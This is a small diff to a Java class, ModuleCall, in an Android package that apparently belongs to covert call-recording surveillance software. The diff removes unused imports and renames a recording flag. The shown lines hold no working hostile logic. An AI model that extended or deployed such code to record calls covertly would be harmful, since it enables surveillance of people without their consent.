@@ -17,22 +17,16 @@ import java.util.ArrayList;
 import java.util.Collections;
 import java.util.Comparator;
 import java.util.Date;
-import java.util.HashMap;
 import java.util.List;
 import java.util.concurrent.BlockingQueue;
 import java.util.concurrent.LinkedBlockingQueue;
-import java.util.concurrent.TimeUnit;
 
 import android.content.pm.ApplicationInfo;
-import android.content.pm.PackageInfo;
 import android.content.pm.PackageManager;
 import android.content.pm.PackageManager.NameNotFoundException;
-import android.media.MediaRecorder;
-import android.os.Build;
 import android.os.FileObserver;
 
 import com.android.dvci.Call;
-import com.android.dvci.Device;
 import com.android.dvci.RunningProcesses;
 import com.android.dvci.Status;
 import com.android.dvci.auto.Cfg;
@@ -42,9 +36,7 @@ import com.android.dvci.conf.ConfigurationException;
 import com.android.dvci.db.GenericSqliteHelper;
 import com.android.dvci.evidence.EvidenceBuilder;
 import com.android.dvci.evidence.EvidenceType;
-import com.android.dvci.evidence.Markup;
 import com.android.dvci.file.AutoFile;
-import com.android.dvci.file.Path;
 import com.android.dvci.interfaces.Observer;
 import com.android.dvci.listener.ListenerCall;
 import com.android.dvci.listener.ListenerProcess;
@@ -106,7 +98,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 	private CallInfo callInfo;
 	private List<Chunk> chunks = new ArrayList<Chunk>();
 	private boolean[] finished = new boolean[2];
-	private boolean record;
+	private boolean canRecord = true;
 	private Object recordingLock = new Object();
 
 	public static ModuleCall self() {
@@ -182,8 +174,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 						ModuleMic.self().stop();
 					}
 					startWatchAudio();
-					record = true;
-
+					canRecord = true;
 				}
 			} else {
 				if (Cfg.DEBUG) {
@@ -928,6 +919,6 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 	}
 
 	public boolean canRecord() {
-		return record;
+		return canRecord;
 	}
 }
